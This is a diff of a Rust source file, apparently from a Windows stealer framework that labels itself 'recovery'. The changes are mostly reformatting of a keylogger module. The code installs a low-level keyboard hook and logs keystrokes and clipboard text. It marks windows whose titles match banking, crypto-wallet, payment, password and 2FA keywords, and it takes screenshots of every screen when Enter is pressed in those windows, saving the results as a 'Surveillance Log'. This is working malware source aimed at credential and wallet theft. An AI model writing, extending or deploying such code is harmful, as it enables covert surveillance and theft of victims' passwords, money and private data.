@@ -1,25 +1,21 @@
 use crate::recovery::context::RecoveryContext;
-use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use crate::recovery::screenshot;
 use crate::recovery::storage::output::write_binary_artifact;
+use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
 use once_cell::sync::Lazy;
+use std::sync::mpsc::{Receiver, Sender, channel};
 use std::sync::{Arc, Mutex};
-use std::sync::mpsc::{channel, Sender, Receiver};
 use std::time::{Duration, SystemTime};
 use tokio::time::interval;
 use tracing::error;
-use windows::Win32::Foundation::{HGLOBAL, HMODULE, HWND, LPARAM, LRESULT, WPARAM, HINSTANCE};
+use windows::Win32::Foundation::{HGLOBAL, HINSTANCE, HMODULE, HWND, LPARAM, LRESULT, WPARAM};
 use windows::Win32::System::DataExchange::{
-    CloseClipboard, GetClipboardData, OpenClipboard, AddClipboardFormatListener,
+    AddClipboardFormatListener, CloseClipboard, GetClipboardData, OpenClipboard,
 };
 use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};
 use windows::Win32::System::ProcessStatus::GetModuleBaseNameW;
-use windows::Win32::System::Threading::{
-    OpenProcess,
-    PROCESS_QUERY_INFORMATION,
-    PROCESS_VM_READ,
-};
+use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
 use windows::Win32::UI::Input::KeyboardAndMouse::*;
 use windows::Win32::UI::WindowsAndMessaging::*;
 
@@ -50,28 +46,25 @@ impl RecoveryTask for KeyloggerTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let log_file_path = ctx.output_dir.join("system_event.log");
         let (tx, rx) = channel();
-        
+
         {
             let mut sender_lock = EVENT_SENDER.lock().unwrap();
             *sender_lock = Some(tx);
         }
 
-        // 1. Spawn Event Processor
         let buffer = KEY_LOG_BUFFER.clone();
         let ctx_clone = ctx.clone();
         std::thread::spawn(move || {
             run_event_processor(rx, buffer, ctx_clone);
         });
 
-        // 2. Spawn Hook Thread
         std::thread::spawn(move || {
             install_hook_and_listener();
         });
 
-        // 3. Spawn File Flusher
         let flush_path = log_file_path.clone();
         let flush_buffer = KEY_LOG_BUFFER.clone();
-        
+
         tokio::spawn(async move {
             let mut interval = interval(Duration::from_secs(10));
             loop {
@@ -92,13 +85,13 @@ impl RecoveryTask for KeyloggerTask {
                     .append(true)
                     .open(&flush_path)
                     .await;
-                
+
                 if let Ok(mut f) = file {
                     let _ = f.write_all(content.as_bytes()).await;
                 }
             }
         });
-        
+
         Ok(vec![RecoveryArtifact {
             label: "Surveillance Log".to_string(),
             path: log_file_path,
@@ -111,13 +104,8 @@ impl RecoveryTask for KeyloggerTask {
 fn install_hook_and_listener() {
     unsafe {
         let h_instance = HMODULE::default();
-        
-        let hook_result = SetWindowsHookExW(
-            WH_KEYBOARD_LL,
-            Some(hook_callback),
-            h_instance,
-            0,
-        );
+
+        let hook_result = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), h_instance, 0);
 
         let hook_id = match hook_result {
             Ok(h) => h,
@@ -142,7 +130,10 @@ fn install_hook_and_listener() {
             class_name,
             windows::core::w!("IxodesMsgWindow"),
             WINDOW_STYLE::default(),
-            0, 0, 0, 0,
+            0,
+            0,
+            0,
+            0,
             HWND_MESSAGE,
             HMENU::default(),
             h_instance,
@@ -158,7 +149,7 @@ fn install_hook_and_listener() {
             TranslateMessage(&msg);
             DispatchMessageW(&msg);
         }
-        
+
         let _ = UnhookWindowsHookEx(hook_id);
     }
 }
@@ -175,7 +166,12 @@ unsafe extern "system" fn hook_callback(code: i32, wparam: WPARAM, lparam: LPARA
     unsafe { CallNextHookEx(HHOOK::default(), code, wparam, lparam) }
 }
 
-unsafe extern "system" fn window_proc(hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
+unsafe extern "system" fn window_proc(
+    hwnd: HWND,
+    msg: u32,
+    wparam: WPARAM,
+    lparam: LPARAM,
+) -> LRESULT {
     if msg == WM_CLIPBOARDUPDATE {
         if let Some(tx) = EVENT_SENDER.lock().unwrap().as_ref() {
             let _ = tx.send(LogEvent::Clipboard);
@@ -200,12 +196,18 @@ fn run_event_processor(rx: Receiver<LogEvent>, buffer: Arc<Mutex<String>>, ctx: 
                 if current_window != last_window {
                     let time = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                     is_sensitive = check_sensitivity(&title, &process);
-                    let marker = if is_sensitive { " [!!! SENSITIVE !!!]" } else { "" };
-                    log_entry.push_str(&format!("\n\n--- Window: {}{}{} ---\n", current_window, marker, time));
+                    let marker = if is_sensitive {
+                        " [!!! SENSITIVE !!!]"
+                    } else {
+                        ""
+                    };
+                    log_entry.push_str(&format!(
+                        "\n\n--- Window: {}{}{} ---\n",
+                        current_window, marker, time
+                    ));
                     last_window = current_window;
                 }
 
-                // Trigger screenshot on Enter in sensitive window
                 if is_sensitive && vk == 0x0D {
                     trigger_screenshot(&ctx);
                 }
@@ -221,7 +223,8 @@ fn run_event_processor(rx: Receiver<LogEvent>, buffer: Arc<Mutex<String>>, ctx: 
                 if let Some(text) = get_clipboard_text() {
                     if text != last_clipboard && !text.trim().is_empty() {
                         let time = chrono::Local::now().format("%H:%M:%S");
-                        let log = format!("\n\n[CLIPBOARD @ {}]\n{}\n[END CLIPBOARD]\n", time, text);
+                        let log =
+                            format!("\n\n[CLIPBOARD @ {}]\n{}\n[END CLIPBOARD]\n", time, text);
                         let mut lock = buffer.lock().unwrap();
                         lock.push_str(&log);
                         last_clipboard = text;
@@ -234,25 +237,60 @@ fn run_event_processor(rx: Receiver<LogEvent>, buffer: Arc<Mutex<String>>, ctx: 
 
 fn check_sensitivity(title: &str, process: &str) -> bool {
     let keywords = [
-        "login", "signin", "bank", "crypto", "wallet", "password", "passphrase",
-        "checkout", "payment", "card", "vault", "auth", "mfa", "2fa",
-        "binance", "coinbase", "metamask", "kraken", "paypal", "stripe",
+        "login",
+        "signin",
+        "bank",
+        "crypto",
+        "wallet",
+        "password",
+        "passphrase",
+        "checkout",
+        "payment",
+        "card",
+        "vault",
+        "auth",
+        "mfa",
+        "2fa",
+        "binance",
+        "coinbase",
+        "metamask",
+        "kraken",
+        "paypal",
+        "stripe",
     ];
     let lower_title = title.to_lowercase();
     let lower_process = process.to_lowercase();
-    
-    keywords.iter().any(|&k| lower_title.contains(k) || lower_process.contains(k))
+
+    keywords
+        .iter()
+        .any(|&k| lower_title.contains(k) || lower_process.contains(k))
 }
 
 fn trigger_screenshot(ctx: &RecoveryContext) {
     let captures = screenshot::capture_all_screens();
-    if captures.is_empty() { return; }
-    
+    if captures.is_empty() {
+        return;
+    }
+
     let ctx_clone = ctx.clone();
     tokio::spawn(async move {
         for capture in captures {
-            let name = format!("sensitive-{}-{}.png", SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_secs(), capture.index);
-            let _ = write_binary_artifact(&ctx_clone, RecoveryCategory::System, "Surveillance", &name, &capture.png_bytes).await;
+            let name = format!(
+                "sensitive-{}-{}.png",
+                SystemTime::now()
+                    .duration_since(SystemTime::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs(),
+                capture.index
+            );
+            let _ = write_binary_artifact(
+                &ctx_clone,
+                RecoveryCategory::System,
+                "Surveillance",
+                &name,
+                &capture.png_bytes,
+            )
+            .await;
         }
     });
 }
@@ -263,7 +301,7 @@ fn get_foreground_info() -> (String, String) {
         if hwnd.0 == 0 {
             return ("Unknown".to_string(), "Unknown".to_string());
         }
-        
+
         let len = GetWindowTextLengthW(hwnd);
         let title = if len > 0 {
             let mut buf = vec![0u16; (len + 1) as usize];
@@ -275,21 +313,24 @@ fn get_foreground_info() -> (String, String) {
 
         let mut process_id = 0;
         GetWindowThreadProcessId(hwnd, Some(&mut process_id));
-        
+
         let process_name = if process_id != 0 {
             let process_handle = OpenProcess(
-                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
+                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                 false,
-                process_id
+                process_id,
             );
-            
+
             if let Ok(h_proc) = process_handle {
                 let mut mod_buf = [0u16; 260];
                 let success = GetModuleBaseNameW(h_proc, HMODULE::default(), &mut mod_buf);
                 let _ = windows::Win32::Foundation::CloseHandle(h_proc);
-                
+
                 if success > 0 {
-                    let end = mod_buf.iter().position(|&c| c == 0).unwrap_or(mod_buf.len());
+                    let end = mod_buf
+                        .iter()
+                        .position(|&c| c == 0)
+                        .unwrap_or(mod_buf.len());
                     String::from_utf16_lossy(&mod_buf[..end])
                 } else {
                     "Unknown".to_string()
@@ -317,7 +358,6 @@ fn map_key(vk: u32) -> String {
         0x26 => return "[UP]".to_string(),
         0x27 => return "[RIGHT]".to_string(),
         0x28 => return "[DOWN]".to_string(),
-        // Modifiers
         0x10 | 0xA0 | 0xA1 | 0x11 | 0xA2 | 0xA3 | 0x12 | 0xA4 | 0xA5 => return String::new(),
         _ => {}
     }
@@ -325,26 +365,26 @@ fn map_key(vk: u32) -> String {
     unsafe {
         let mut state = [0u8; 256];
         let _ = GetKeyboardState(&mut state);
-        
+
         let mut buf = [0u16; 16];
         let scan_code = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
-        
+
         let result = ToUnicode(vk, scan_code, Some(&state), &mut buf, 0);
-        
+
         if result > 0 {
             let s = String::from_utf16_lossy(&buf[..result as usize]);
             if (state[VK_CONTROL.0 as usize] & 0x80) != 0 {
-                 return format!("[CTRL+{}]", s.to_uppercase());
+                return format!("[CTRL+{}]", s.to_uppercase());
             }
             s
         } else if result == -1 {
             String::new()
         } else {
-             if vk >= 0x70 && vk <= 0x87 {
-                 format!("[F{}]", vk - 0x6F)
-             } else {
-                 String::new()
-             }
+            if vk >= 0x70 && vk <= 0x87 {
+                format!("[F{}]", vk - 0x6F)
+            } else {
+                String::new()
+            }
         }
     }
 }
@@ -358,7 +398,9 @@ fn get_clipboard_text() -> Option<String> {
                     let h_global = HGLOBAL(h_data.0 as *mut std::ffi::c_void);
                     let ptr = GlobalLock(h_global);
                     if !ptr.is_null() {
-                        let len = (0..).take_while(|&i| *ptr.cast::<u16>().add(i) != 0).count();
+                        let len = (0..)
+                            .take_while(|&i| *ptr.cast::<u16>().add(i) != 0)
+                            .count();
                         let slice = std::slice::from_raw_parts(ptr.cast::<u16>(), len);
                         let text = String::from_utf16_lossy(slice);
                         let _ = GlobalUnlock(h_global);
